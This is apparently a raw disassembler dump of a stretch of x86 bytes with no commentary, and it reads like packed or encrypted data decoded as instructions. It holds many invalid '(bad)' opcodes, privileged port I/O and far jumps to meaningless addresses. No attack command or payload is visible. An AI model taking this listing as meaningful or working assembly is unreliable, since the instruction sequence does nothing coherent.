  41c4e0:	in     al,0xb7
  41c4e2:	mov    al,ds:0x2ec94fc
  41c4e7:	jno    0x41c496
  41c4e9:	sbb    al,bh
  41c4eb:	gs pop ss
  41c4ed:	xor    edi,0xffffff81
  41c4f0:	xor    bl,cl
  41c4f2:	sbb    eax,0x5ede4cb7
  41c4f7:	mov    cl,BYTE PTR ds:0x3ce8433d
  41c4fd:	repnz scas al,BYTE PTR es:[edi]
  41c4ff:	push   ecx
  41c500:	sbb    al,0x16
  41c502:	in     eax,0xc0
  41c504:	out    0xd,eax
  41c506:	out    dx,eax
  41c507:	ss sub eax,0x76fd3d74
  41c50d:	cwde   
  41c50e:	mov    eax,ds:0x594c7619
  41c513:	sbb    dl,dh
  41c515:	adc    BYTE PTR [esi+0x72],0x76
  41c519:	pop    esp
  41c51a:	dec    esi
  41c51b:	mov    ds:0xa92a4e1e,eax
  41c520:	pop    eax
  41c521:	mov    ah,BYTE PTR [ebx-0x74]
  41c524:	das    
  41c525:	xor    ch,BYTE PTR [edx+esi*1+0x3fd9327d]
  41c52c:	and    DWORD PTR [esi+esi*8+0x74],esp
  41c530:	dec    ebp
  41c531:	xor    eax,0x23a41325
  41c536:	fwait
  41c537:	jno    0x41c533
  41c539:	les    esp,FWORD PTR [ebp-0x50dddd57]
  41c53f:	sbb    al,0xde
  41c541:	sub    eax,0xb24e8142
  41c546:	lds    esi,FWORD PTR [esp+eax*4-0x35a0ab64]
  41c54d:	pop    ebp
  41c54e:	mov    bl,0x34
  41c550:	popf   
  41c551:	shr    ecx,1
  41c553:	jmp    0x41c4e8
  41c555:	test   al,0xaa
  41c557:	push   ecx
  41c558:	and    dh,ch
  41c55a:	or     BYTE PTR [ebp-0x45c24032],0xfd
  41c561:	inc    ecx
  41c562:	adc    eax,0x52e6fc38
  41c567:	and    eax,0x9982c741
  41c56c:	adc    eax,ecx
  41c56e:	adc    eax,0xb967a845
  41c573:	cli    
  41c574:	sbb    bl,BYTE PTR [esp+ebx*2+0x7d3a14e5]
  41c57b:	and    bh,BYTE PTR [ebp+0x75]
  41c57e:	adc    al,0xf3
  41c580:	xlat   BYTE PTR ds:[ebx]
  41c581:	sti    
  41c582:	div    DWORD PTR [ebp-0x2f290f99]
  41c588:	mov    ds,WORD PTR [ebx-0x4c77a0ce]
  41c58e:	xchg   DWORD PTR [edi],esp
  41c590:	mov    bl,0x37
  41c592:	cwde   
  41c593:	sbb    BYTE PTR [edi+0x53b5a592],bl
  41c599:	or     BYTE PTR [ebx],bh
  41c59b:	mov    ah,0xfd
  41c59d:	cli    
  41c59e:	pop    edi
  41c59f:	mov    ecx,0x783d4cb9
  41c5a4:	dec    ebp
  41c5a5:	sub    BYTE PTR ds:0xb3392888,cl
  41c5ab:	xor    BYTE PTR [esi-0x70],0xd
  41c5af:	mov    cl,0x64
  41c5b1:	mov    eax,ds:0xce4367d7
  41c5b6:	scas   al,BYTE PTR es:[edi]
  41c5b7:	mov    al,BYTE PTR ds:[esi]
  41c5ba:	popa   
  41c5bb:	sbb    eax,0x463b0424
  41c5c0:	add    BYTE PTR [ebp-0x1396b51f],bh
  41c5c6:	or     edi,DWORD PTR [eax-0x53]
  41c5c9:	dec    ecx
  41c5ca:	fsub   QWORD PTR ds:0x554c22c2
  41c5d0:	ss mov ah,0x6b
  41c5d3:	lahf   
  41c5d4:	loope  0x41c581
  41c5d6:	push   eax
  41c5d7:	add    ebp,DWORD PTR [esp+edi*4]
  41c5da:	call   0x950b2393
  41c5df:	int3   
  41c5e0:	mov    WORD PTR [ebp+0x3a],es
  41c5e3:	cmc    
  41c5e4:	pop    esi
  41c5e5:	sbb    DWORD PTR [esi],0xfffffffe
  41c5e8:	mov    DWORD PTR [esi+eax*2],ebp
  41c5eb:	sbb    eax,0x42359e92
  41c5f0:	pop    esp
  41c5f1:	mov    WORD PTR [edi],gs
  41c5f3:	stos   DWORD PTR es:[edi],eax
  41c5f4:	sbb    bh,dh
  41c5f6:	test   BYTE PTR [edx],cl
  41c5f8:	outs   dx,BYTE PTR ds:[esi]
  41c5f9:	dec    esp
  41c5fa:	dec    ebp
  41c5fb:	scas   eax,DWORD PTR es:[edi]
  41c5fc:	loop   0x41c5ad
  41c5fe:	xor    dl,BYTE PTR [ecx+0x65d04244]
  41c604:	mov    dh,0x31
  41c606:	in     eax,0xf
  41c608:	inc    esi
  41c609:	push   esp
  41c60a:	fnstenv [edi+0x249915f6]
  41c610:	in     al,dx
  41c611:	loop   0x41c608
  41c613:	dec    eax
  41c614:	ret    0xf5d0
  41c617:	adc    eax,DWORD PTR [edx-0x748b2fcc]
  41c61d:	mov    ah,0x32
  41c61f:	xchg   edi,eax
  41c620:	mov    ds:0x69255f1f,eax
  41c625:	out    0x8e,eax
  41c627:	xchg   ebx,eax
  41c628:	mov    al,bl
  41c62a:	lock cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41c62d:	dec    ebp
  41c62e:	jno    0x9017eda4
  41c634:	fnsave [esi]
  41c636:	xchg   edi,eax
  41c637:	arpl   WORD PTR [edx],di
  41c639:	adc    dl,BYTE PTR [ebp-0x60910cc1]
  41c63f:	add    dl,bh
  41c641:	adc    BYTE PTR [ecx-0x43d28453],0x78
  41c648:	test   DWORD PTR gs:[ecx],esi
  41c64b:	cmp    al,dh
  41c64d:	push   esi
  41c64e:	iret   
  41c64f:	jp     0x41c628
  41c651:	pop    es
  41c652:	mov    esi,ebp
  41c654:	mov    DWORD PTR [eax+eax*2-0x6d],edx
  41c658:	push   edx
  41c659:	and    eax,0x274d5e77
  41c65e:	xchg   ebp,eax
  41c65f:	push   cs
  41c660:	cmp    dh,ah
  41c662:	imul   ebx,DWORD PTR [edx],0x32404987
  41c668:	xor    DWORD PTR [eax-0x2a],ebp
  41c66b:	dec    ebx
  41c66c:	je     0x41c5f7
  41c66e:	clc    
  41c66f:	(bad)  
  41c670:	rol    DWORD PTR [esi-0x28],1
  41c673:	dec    ebx
  41c674:	js     0x41c6a1
  41c676:	dec    eax
  41c677:	repz retf 0x6a7a
  41c67b:	test   DWORD PTR [esi],ebx
  41c67d:	cwde   
  41c67e:	sub    BYTE PTR [edx+esi*4],cl
  41c681:	les    esi,FWORD PTR [edi-0x4d5f5b90]
  41c687:	dec    edx
  41c688:	nop
  41c689:	neg    DWORD PTR [ebx+edi*8-0x16]
  41c68d:	(bad)  
  41c68e:	f2xm1  
  41c690:	or     eax,0x8bd3c9ce
  41c695:	daa    
  41c696:	fsubr  DWORD PTR [ebx-0x4c88bbfa]
  41c69c:	jns    0x41c717
  41c69e:	dec    ecx
  41c69f:	shr    di,0xf4
  41c6a3:	pusha  
  41c6a4:	int3   
  41c6a5:	jle    0x41c679
  41c6a7:	imul   edx,edx,0x4a
  41c6aa:	jne    0x41c710
  41c6ac:	fcomip st,st(2)
  41c6ae:	inc    ebp
  41c6af:	cmp    BYTE PTR [edi],al
  41c6b1:	fidiv  WORD PTR [ecx]
  41c6b3:	jnp    0x41c722
  41c6b5:	xlat   BYTE PTR ds:[ebx]
  41c6b6:	(bad)  
  41c6b7:	out    0x2d,eax
  41c6b9:	dec    eax
  41c6ba:	cmp    BYTE PTR [ebx+0x733dcfec],0x8
  41c6c1:	popf   
  41c6c2:	daa    
  41c6c3:	pop    es
  41c6c4:	ficom  WORD PTR [esi+0xa]
  41c6c7:	adc    al,0xce
  41c6c9:	(bad)  
  41c6ca:	in     al,0xf2
  41c6cc:	jmp    DWORD PTR [edi]
  41c6ce:	or     al,0x5e
  41c6d0:	mov    DWORD PTR [edx],edx
  41c6d2:	inc    ecx
  41c6d3:	xchg   DWORD PTR [esi],edi
  41c6d5:	imul   esi,DWORD PTR [eax+eiz*1-0x3c],0xffffffd3
  41c6da:	pop    ebx
  41c6db:	jle    0x41c73c
  41c6dd:	jns    0x41c661
  41c6df:	rcl    edi,1
  41c6e1:	adc    ebp,DWORD PTR [edi]
  41c6e3:	pop    edi
  41c6e4:	pop    ebx
  41c6e5:	mov    dl,0xeb
  41c6e7:	or     ebp,eax
  41c6e9:	in     al,dx
  41c6ea:	inc    ebp
  41c6eb:	cmp    BYTE PTR [edx+0x2cab30bf],0x2f
  41c6f2:	icebp  
  41c6f3:	jne    0x41c72b
  41c6f5:	std    
  41c6f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f7:	xchg   DWORD PTR [eax+0x6b569c7e],edi
  41c6fd:	add    BYTE PTR [ebp+0x1035b1eb],cl
  41c703:	rcl    edx,cl
  41c705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c706:	xchg   edi,eax
  41c707:	jmp    0x41c735
  41c709:	ret    0x4be5
  41c70c:	(bad)  
  41c70d:	imul   BYTE PTR [edi+eiz*2-0x4d]
  41c711:	adc    al,0xab
  41c713:	nop
  41c714:	push   edx
  41c715:	outs   dx,DWORD PTR ds:[esi]
  41c716:	mov    eax,0xfdf00ab5
  41c71b:	fwait
  41c71c:	mov    ch,0x93
  41c71e:	lods   eax,DWORD PTR ds:[esi]
  41c71f:	inc    ebp
  41c720:	gs fs int 0x6f
  41c724:	daa    
  41c725:	fimul  WORD PTR [edx+0x4c86403c]
  41c72b:	inc    eax
  41c72c:	xor    BYTE PTR [edx+0x6],dh
  41c72f:	jmp    0x9d08:0x6405c458
  41c736:	fist   DWORD PTR [ebx-0xb]
  41c739:	test   ch,al
  41c73b:	out    0x70,eax
  41c73d:	xchg   ecx,eax
  41c73e:	ja     0x41c730
  41c740:	inc    esi
  41c741:	scas   eax,DWORD PTR es:[edi]
  41c742:	fstp   TBYTE PTR [edi+0x50]
  41c745:	dec    ebp
  41c746:	shl    BYTE PTR [edi-0x5b],cl
  41c749:	sub    BYTE PTR [edx+0x5df076a3],0x6c
  41c750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c751:	cmp    DWORD PTR [esi],edx
  41c753:	or     BYTE PTR [ebx],bl
  41c755:	pusha  
  41c756:	push   ss
  41c757:	jns    0x41c728
  41c759:	or     esp,DWORD PTR ds:0xb3f2b1f
  41c75f:	mov    ebp,0x3e3c3f6f
  41c764:	repz mov eax,ds:0xff040d8d
  41c76a:	sbb    eax,0x9b0aca67
  41c76f:	pop    edx
  41c770:	jmp    0xcaa48a52
  41c775:	inc    edi
  41c776:	enter  0xd2da,0xd6
  41c77a:	jb     0x41c7a8
  41c77c:	dec    esp
  41c77d:	xchg   edx,eax
  41c77e:	jmp    0x93def576
  41c783:	push   ss
  41c784:	dec    dl
  41c786:	sahf   
  41c787:	pop    ds
  41c788:	fadd   DWORD PTR [esi-0xeda663d]
  41c78e:	mov    edx,?
  41c790:	jbe    0x41c787
  41c792:	cmp    BYTE PTR [ebx+0x1a89f7b8],0x50
  41c799:	sbb    DWORD PTR [edx],ebx
  41c79b:	add    cl,BYTE PTR [ecx]
  41c79d:	and    dh,BYTE PTR [edx+0x0]
  41c7a0:	fst    DWORD PTR [esi+ebx*2-0x4c6fa3cc]
  41c7a7:	cs daa 
  41c7a9:	cwde   
  41c7aa:	mov    ?,WORD PTR [ecx-0x5]
  41c7ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7ae:	cmc    
  41c7af:	or     BYTE PTR [edx],al
  41c7b1:	cdq    
  41c7b2:	daa    
  41c7b3:	mov    ah,0x3
  41c7b5:	in     al,dx
  41c7b6:	jmp    0x41c787
  41c7b8:	sbb    DWORD PTR [edx+edi*1+0x65],eax
  41c7bc:	and    edi,DWORD PTR [ebx]
  41c7be:	popa   
  41c7bf:	out    dx,al
  41c7c0:	jecxz  0x41c762
  41c7c2:	test   al,0x38
  41c7c4:	ret    0xacb0
  41c7c7:	jecxz  0x41c7e5
  41c7c9:	pusha  
  41c7ca:	add    ebx,DWORD PTR [eax+0x6d948ad2]
  41c7d0:	cmp    BYTE PTR [ecx+0x6ccf98d9],dh
  41c7d6:	jecxz  0x41c774
  41c7d8:	xor    BYTE PTR ds:0xa86287fa,0x6c
  41c7df:	es jmp 0x85f7e22d
  41c7e5:	cmp    eax,0x10acb4d3
  41c7ea:	pop    ss
  41c7eb:	call   0xe6d:0xd8b3a4dc
  41c7f2:	jae    0x41c7c1
  41c7f4:	cmc    
  41c7f5:	fistp  QWORD PTR [edx-0x2a748488]
  41c7fb:	inc    eax
  41c7fc:	and    al,0xc2
  41c7fe:	(bad)
  41c803:	mov    dl,BYTE PTR [eax+ebp*8]
  41c806:	push   edx
  41c807:	fistp  DWORD PTR [eax+0x50057924]
  41c80d:	pop    ebp
  41c80e:	icebp  
  41c80f:	shr    DWORD PTR [ebp-0x420fcfb3],0x4e
  41c816:	cmp    dh,BYTE PTR [esi]
  41c818:	dec    esi
  41c819:	mov    bl,0xb9
  41c81b:	ret    
  41c81c:	pop    ss
  41c81d:	xor    eax,DWORD PTR [ecx-0x17]
  41c820:	push   edx
  41c821:	cmp    BYTE PTR [ebp-0x59],dh
  41c824:	xor    dh,BYTE PTR [ecx+0x19]
  41c827:	inc    ebp
  41c828:	ror    ebx,1
  41c82a:	lds    eax,FWORD PTR [edx+0x2d]
  41c82d:	js     0x41c7d9
  41c82f:	xchg   DWORD PTR [esi+0x5de9cc52],esi
  41c835:	enter  0x817c,0x41
  41c839:	inc    ecx
  41c83a:	adc    dl,0xa1
  41c83d:	fpatan 
  41c83f:	mov    ecx,0x131b481e
  41c844:	or     BYTE PTR [ebp-0x3],bl
  41c847:	(bad)  
  41c848:	cmp    edi,DWORD PTR [edx+0x48]
  41c84b:	push   ebp
  41c84c:	add    al,0x6a
  41c84e:	test   eax,0x562a2a49
  41c853:	xor    ah,BYTE PTR [ecx]
  41c855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c856:	add    al,BYTE PTR [eax]
	...
  41c860:	add    ah,al
  41c862:	leave  
  41c863:	or     BYTE PTR [eax-0x12131ef3],ah
  41c869:	add    BYTE PTR [esi-0x1e],al
  41c86c:	or     eax,esp
  41c86e:	enter  0xe685,0xdf
  41c872:	inc    esp
  41c873:	add    DWORD PTR [eax],eax
  41c875:	scas   al,BYTE PTR es:[edi]
  41c876:	add    eax,DWORD PTR [eax]
  41c878:	add    BYTE PTR [ecx-0x69],dh
  41c87b:	cmp    al,0x6d
  41c87d:	sbb    cl,BYTE PTR [ebx-0x1e2c4350]
  41c883:	cld    
  41c884:	mov    al,ds:0x4825020f
  41c889:	mov    esp,0xa5b0841d
  41c88e:	mov    ah,0x29
  41c890:	pop    ds
  41c891:	push   es
  41c892:	aad    0xf8
  41c894:	dec    eax
  41c895:	out    0x3c,eax
  41c897:	inc    eax
  41c898:	mov    esi,DWORD PTR [edi-0x6d]
  41c89b:	pop    ds
  41c89c:	cmp    al,0xaf
  41c89e:	scas   al,BYTE PTR es:[edi]
  41c89f:	push   ds
  41c8a0:	stos   BYTE PTR es:[edi],al
  41c8a1:	(bad)  
  41c8a2:	adc    al,BYTE PTR [edi+ecx*1+0x22]
  41c8a6:	aas    
  41c8a7:	pop    ss
  41c8a8:	ja     0x41c8c5
  41c8aa:	xlat   BYTE PTR ds:[ebx]
  41c8ab:	cmp    eax,0x47622b38
  41c8b0:	push   edi
  41c8b1:	push   edi
  41c8b2:	enter  0xe535,0xfc
  41c8b6:	shr    BYTE PTR [edx],0x84
  41c8b9:	jl     0x41c8d1
  41c8bb:	aas    
  41c8bc:	pop    eax
  41c8bd:	jge    0x41c8dd
  41c8bf:	es stos DWORD PTR es:[edi],eax
  41c8c1:	mov    bl,0x54
  41c8c3:	ret    0x78aa
  41c8c6:	mov    ebp,DWORD PTR ds:0xc90ca87a
  41c8cc:	aad    0xa
  41c8ce:	cmc    
  41c8cf:	or     eax,0xd9498377
  41c8d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8d5:	mov    ebp,DWORD PTR [edx-0x7daff163]
  41c8db:	jecxz  0x41c871
  41c8dd:	test   eax,0x5b4b42fb
  41c8e2:	xlat   BYTE PTR ds:[ebx]
  41c8e3:	mov    edx,esi
  41c8e5:	retf   
  41c8e6:	jmp    0x83d3:0xb496ccb
  41c8ed:	nop
  41c8ee:	sub    esp,edi
  41c8f0:	leave  
  41c8f1:	int    0x21
  41c8f3:	inc    ebp
  41c8f4:	xor    ebx,DWORD PTR [edi+0x19]
  41c8f7:	xchg   ah,ah
  41c8f9:	stos   BYTE PTR es:[edi],al
  41c8fa:	out    dx,eax
  41c8fb:	pop    esi
  41c8fc:	push   0xffffffe4
  41c8fe:	repnz (bad) 
  41c901:	xchg   ecx,eax
  41c902:	fistp  QWORD PTR [ecx]
  41c904:	addr16 add cl,al
  41c907:	test   ebp,ecx
  41c909:	ins    DWORD PTR es:[edi],dx
  41c90a:	push   esi
  41c90b:	add    al,0xf7
  41c90d:	xor    al,0xa1
  41c90f:	pop    ecx
  41c910:	jp     0x41c925
  41c912:	dec    ecx
  41c913:	fldl2e 
  41c915:	push   ebp
  41c916:	(bad)  
  41c917:	(bad)  
  41c918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c919:	and    bl,al
  41c91b:	jne    0x41c965
  41c91d:	mov    DWORD PTR [ebx+esi*1+0x2],esp
  41c921:	int    0x3f
  41c923:	push   cs
  41c924:	dec    ebp
  41c925:	icebp  
  41c926:	ins    DWORD PTR es:[edi],dx
  41c927:	fisub  DWORD PTR [esi+0x6a2faeea]
  41c92d:	pop    eax
  41c92e:	dec    edi
  41c92f:	shl    DWORD PTR [edi-0x5d03e2b8],cl
  41c935:	in     al,0x31
  41c937:	push   cs
  41c938:	imul   edi,DWORD PTR [esi-0x7446936b],0xffffffdc
  41c93f:	inc    eax
  41c940:	push   esp
  41c941:	sub    DWORD PTR [edi+0x779bb424],eax
  41c947:	add    esi,edi
  41c949:	add    bl,al
  41c94b:	fucomi st,st(3)
  41c94d:	mov    al,ds:0x4e7b64ef
  41c952:	xchg   edx,eax
  41c953:	add    al,0x2d
  41c955:	cmp    dh,al
  41c957:	xchg   edx,eax
  41c958:	rcl    esi,1
  41c95a:	add    BYTE PTR [eax+0x4a3e896a],0x19
  41c961:	aas    
  41c962:	outs   dx,BYTE PTR ds:[esi]
  41c963:	sti    
  41c964:	loopne 0x41c972
  41c966:	stos   DWORD PTR es:[edi],eax
  41c967:	cwde   
  41c968:	dec    ebp
  41c969:	or     DWORD PTR ds:0x20d0a2ad,esi
  41c96f:	scas   al,BYTE PTR es:[edi]
  41c970:	bound  eax,QWORD PTR [eax-0x5a7447b]
  41c976:	ret    0xfe8b
  41c979:	in     eax,0xb8
  41c97b:	test   DWORD PTR [edi+0x3f],ebp
  41c97e:	sahf   
  41c97f:	(bad)  
  41c980:	mov    edi,DWORD PTR [esi+0x5c]
  41c983:	xchg   ebx,eax
  41c984:	fistp  WORD PTR [bx+si]
  41c987:	repz push ss
  41c989:	pusha  
  41c98a:	inc    ebx
  41c98b:	xchg   ebx,eax
  41c98c:	call   0x6eeaa324
  41c991:	inc    ecx
  41c992:	jmp    0xca6d:0x21cf4c93
  41c999:	call   0x8936:0x40b48091
  41c9a0:	in     al,dx
  41c9a1:	mov    esp,0x3acbe69c
  41c9a6:	adc    BYTE PTR [ecx-0x1a60b768],al
  41c9ac:	test   eax,0x64557c6f
  41c9b1:	fnsave [esi+0x47]
  41c9b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9b5:	adc    BYTE PTR [ebp+0x61264ce8],dl
  41c9bb:	sub    eax,0xd955384b
  41c9c0:	pop    ds
  41c9c1:	pop    esi
  41c9c2:	mov    bh,0x2e
  41c9c4:	data16 loopne 0x41c9d7
  41c9c7:	xchg   ecx,eax
  41c9c8:	es addr16 nop
  41c9cb:	test   al,0x4d
  41c9cd:	dec    edi
  41c9ce:	fist   WORD PTR [edi-0x1fa50c2f]
  41c9d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9d5:	test   al,0xe5
  41c9d7:	sar    DWORD PTR [edx],0xfb
  41c9da:	add    DWORD PTR [eax+0x8],ebx
  41c9dd:	and    bl,BYTE PTR [ebp-0x44]
  41c9e0:	pop    eax
  41c9e1:	jae    0x41ca1b
  41c9e3:	and    al,0x83
  41c9e5:	push   edi
  41c9e6:	(bad)
  41c9e9:	retf   0x4e84
  41c9ec:	push   ebp
  41c9ed:	scas   eax,DWORD PTR es:[edi]
  41c9ee:	xchg   ebx,eax
  41c9ef:	push   es
  41c9f0:	arpl   WORD PTR [eax+0x5d],di
  41c9f3:	mov    ecx,DWORD PTR [ebp+edi*2+0x60]
  41c9f7:	fld    QWORD PTR [ecx-0x2a122d31]
  41c9fd:	sbb    eax,0xe8553632
  41ca02:	cmp    eax,0x808e23f6
  41ca07:	call   0xb3613ed3
  41ca0c:	cs push edx
  41ca0e:	in     al,dx
  41ca0f:	aas    
  41ca10:	mov    ecx,0xdd5593c2
  41ca15:	and    al,0x5
  41ca17:	sub    al,0x4c
  41ca19:	js     0x41c9e2
  41ca1b:	mov    edx,0xf22eade0
  41ca20:	adc    eax,0xb48b05a5
  41ca25:	mov    al,0x2a
  41ca27:	(bad)  
  41ca28:	loope  0x41ca6f
  41ca2a:	not    BYTE PTR [eax]
  41ca2c:	add    BYTE PTR [esi-0x65],ch
  41ca2f:	push   cs
  41ca30:	sahf   
  41ca31:	in     eax,dx
  41ca32:	test   BYTE PTR [ecx-0x3c],dl
  41ca35:	clc    
  41ca36:	mov    eax,ds:0xae509f9
  41ca3b:	(bad)  
  41ca3d:	scas   al,BYTE PTR es:[edi]
  41ca3e:	popa   
  41ca3f:	bnd ja 0x41c9d5
  41ca42:	mov    esi,0xf0c27cad
  41ca47:	add    al,0x5f
  41ca49:	aam    0xa3
  41ca4b:	mov    BYTE PTR [ebx],bh
  41ca4d:	inc    ebp
  41ca4e:	pop    ss
  41ca4f:	mov    bl,0xe7
  41ca51:	and    bh,BYTE PTR [edx-0x6017eb0a]
  41ca57:	inc    ebx
  41ca58:	sbb    al,0xdd
  41ca5a:	(bad)  
  41ca5b:	(bad)
  41ca5e:	mov    dh,0x4d
  41ca60:	mov    bl,cl
  41ca62:	and    DWORD PTR [edx],edi
  41ca64:	inc    esi
  41ca65:	xchg   esi,eax
  41ca66:	das    
  41ca67:	iret   
  41ca68:	aam    0x41
  41ca6a:	fcmovne st,st(2)
  41ca6c:	rcl    ch,0x19
  41ca6f:	sar    DWORD PTR [ecx+0x52ac04c8],1
  41ca75:	into   
  41ca76:	xchg   BYTE PTR [esi],dh
  41ca78:	push   edx
  41ca79:	sub    eax,0xf708e498
  41ca7e:	out    0x4a,al
  41ca80:	mov    al,0x39
  41ca82:	ja     0x41ca87
  41ca84:	icebp  
  41ca85:	gs das 
  41ca87:	sub    BYTE PTR [eax-0x76c4c0d2],0x99
  41ca8e:	pusha  
  41ca8f:	pop    edx
  41ca90:	les    eax,FWORD PTR [edi]
  41ca92:	test   al,0x88
  41ca94:	cmp    ah,dh
  41ca96:	cdq    
  41ca97:	enter  0x6860,0x57
  41ca9b:	sub    DWORD PTR [ecx-0xf],0x90572fef
  41caa2:	pop    es
  41caa3:	inc    BYTE PTR [esi+eiz*2+0x4e2ec5ca]
  41caaa:	cmp    dh,BYTE PTR [esi+0x52]
  41caad:	hlt    
  41caae:	mov    bh,0x7a
  41cab0:	sbb    eax,0x8ee650f1
  41cab5:	lock inc edx
  41cab7:	inc    esp
  41cab8:	nop
  41cab9:	aam    0x56
  41cabb:	sub    eax,0x756ea4e9
  41cac0:	gs (bad) 
  41cac2:	out    dx,al
  41cac3:	dec    esp
  41cac4:	xchg   edx,eax
  41cac5:	jge    0x41cb26
  41cac7:	or     eax,0x2d526f0f
  41cacc:	pop    esi
  41cacd:	sbb    BYTE PTR [eax+0x6b7d143c],bh
  41cad3:	lods   eax,DWORD PTR ds:[esi]
  41cad4:	(bad)  [edx+0x75e07c16]
  41cada:	xor    ah,ch
  41cadc:	dec    esi
  41cadd:	rol    DWORD PTR [esi],1
  41cadf:	pusha  
  41cae0:	iret   
  41cae1:	adc    BYTE PTR [esi+0x52385c97],cl
  41cae7:	cmp    eax,0xc542e8a9
  41caec:	mov    ebx,ecx
  41caee:	xchg   BYTE PTR [edx],ah
  41caf0:	ja     0x41cb6a
  41caf2:	das    
  41caf3:	inc    esi
  41caf4:	aas    
  41caf5:	in     eax,0x92
  41caf7:	shl    DWORD PTR [ebx],0x1c
  41cafa:	dec    esi
  41cafb:	retf   
  41cafc:	xor    al,0x8c
  41cafe:	addr16 jns 0x41cb4f
  41cb01:	jmp    0x41caa9
  41cb03:	inc    edx
  41cb04:	rcr    DWORD PTR [edi+0x3c],1
  41cb07:	mov    ebx,0x85d956e0
  41cb0c:	and    BYTE PTR [eax],al
  41cb0e:	(bad)  
  41cb0f:	iret   
  41cb10:	rcl    dh,1
  41cb12:	arpl   WORD PTR [ecx+0x4905363c],bx
  41cb18:	cmc    
  41cb19:	jmp    0x41cb2d
  41cb1b:	cs cld 
  41cb1d:	jne    0x41cb27
  41cb1f:	arpl   dx,di
  41cb21:	inc    DWORD PTR [ecx+0x3e2f3cb5]
  41cb27:	sbb    eax,0xa89521d8
  41cb2c:	sub    DWORD PTR [esi-0x137eb1d9],ecx
  41cb32:	popf   
  41cb33:	enter  0x9ded,0xc9
  41cb37:	leave  
  41cb38:	push   esp
  41cb39:	pushf  
  41cb3a:	inc    esp
  41cb3b:	mov    esp,DWORD PTR [ebx]
  41cb3d:	push   ebp
  41cb3e:	xchg   edx,eax
  41cb3f:	adc    esi,eax
  41cb41:	xchg   esp,eax
  41cb42:	add    al,0xcf
  41cb44:	add    ecx,DWORD PTR [esi-0x104da815]
  41cb4a:	movaps xmm1,xmm3
  41cb4d:	enter  0xd3c5,0xf7
  41cb51:	push   esi
  41cb52:	into   
  41cb53:	outs   dx,BYTE PTR ds:[esi]
  41cb54:	push   esp
  41cb55:	inc    ecx
  41cb56:	push   cs
  41cb57:	adc    cl,BYTE PTR [ebp+edi*4+0x1d]
  41cb5b:	adc    bh,BYTE PTR [ebx+0x3b]
  41cb5e:	add    bl,bl
  41cb60:	push   ds
  41cb61:	mov    esp,DWORD PTR [ecx+0x3b0c70e0]
  41cb67:	inc    ecx
  41cb68:	xor    ecx,ecx
  41cb6a:	mov    esi,0x47be0984
  41cb6f:	sahf   
  41cb70:	add    BYTE PTR [edx+eiz*1+0x1b9f00de],bh
  41cb77:	xchg   ecx,eax
  41cb78:	mov    ecx,DWORD PTR [edx-0x44]
  41cb7b:	pushf  
  41cb7c:	fdivp  st(5),st
  41cb7e:	add    DWORD PTR [eax-0x7b],0x4619fe9
  41cb85:	outs   dx,DWORD PTR ds:[esi]
  41cb86:	ftst   
  41cb88:	xchg   edi,eax
  41cb89:	call   0x8f4:0x43f1280
  41cb90:	dec    esi
  41cb91:	pop    esp
  41cb92:	dec    BYTE PTR [edi]
  41cb94:	mov    ch,0x52
  41cb96:	mov    al,0x46
  41cb98:	mov    DWORD PTR [edx-0x18],ecx
  41cb9b:	xlat   BYTE PTR ds:[ebx]
  41cb9c:	aad    0x4e
  41cb9e:	jmp    FWORD PTR [eax+0x6dcbc4b5]
  41cba4:	mov    al,ds:0xbd39bc6e
  41cba9:	jbe    0x41cba9
  41cbab:	fs sub eax,0x9e92935a
  41cbb1:	shl    ebx,cl
  41cbb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbb4:	mov    al,0x9
  41cbb6:	aaa    
  41cbb7:	inc    ecx
  41cbb8:	sbb    eax,0xc12add93
  41cbbd:	repz lea esi,[esi]
  41cbc0:	xor    DWORD PTR [edi+0x12],ebp
  41cbc3:	(bad)  [edi-0x3442b032]
  41cbc9:	mov    al,ds:0xde4ecea3
  41cbce:	leave  
  41cbcf:	call   0x46fa5c0f
  41cbd4:	dec    edx
  41cbd5:	sub    ebx,DWORD PTR [esi+edx*2-0x3a7ceb21]
  41cbdc:	cmp    ecx,esp
  41cbde:	push   ds
  41cbdf:	fadd   QWORD PTR [edi-0x450f0819]
  41cbe5:	scas   al,BYTE PTR es:[edi]
  41cbe6:	lods   al,BYTE PTR ds:[esi]
  41cbe7:	cmp    BYTE PTR [ebp+ebx*2-0x4a],ch
  41cbeb:	push   cs
  41cbec:	push   ds
  41cbed:	pop    ebp
  41cbee:	and    al,0xed
  41cbf0:	cmp    eax,0xc06b8b85
  41cbf5:	or     eax,DWORD PTR [eax]
  41cbf7:	(bad)  
  41cbf8:	xchg   edi,eax
  41cbf9:	test   DWORD PTR [edx-0x6347fb35],eax
  41cbff:	addr16 xor al,0xc9
  41cc02:	addr16 jae 0x41cbed
  41cc05:	div    dl
  41cc07:	inc    esp
  41cc08:	leavew 
  41cc0a:	in     al,dx
  41cc0b:	cmp    dh,ah
  41cc0d:	fidivr DWORD PTR [edi]
  41cc0f:	ins    DWORD PTR es:[edi],dx
  41cc10:	push   cs
  41cc11:	xchg   ebx,eax
  41cc12:	sbb    dh,dl
  41cc14:	scas   eax,DWORD PTR es:[edi]
  41cc15:	test   BYTE PTR [ebx-0x429ce056],dl
  41cc1b:	pop    esi
  41cc1c:	xor    DWORD PTR [edi+0x78631784],0xe4e8e99a
  41cc26:	rol    DWORD PTR [eax],cl
	...
  41cc30:	add    BYTE PTR [ecx-0x10111089],bl
  41cc36:	(bad)  
  41cc37:	cdq    
  41cc38:	ja     0x41cbcf
  41cc3a:	daa    
  41cc3b:	xor    DWORD PTR ds:0xb0463bc4,ecx
  41cc41:	lea    ecx,[eax+0x1]
  41cc44:	add    BYTE PTR [esi+0x35000003],ch
  41cc4a:	repz mov cl,0x35
  41cc4d:	in     eax,0xb3
  41cc4f:	push   ss
  41cc50:	sbb    eax,DWORD PTR [esi]
  41cc52:	mov    al,0xe
  41cc54:	ret    0x665
  41cc57:	cli    
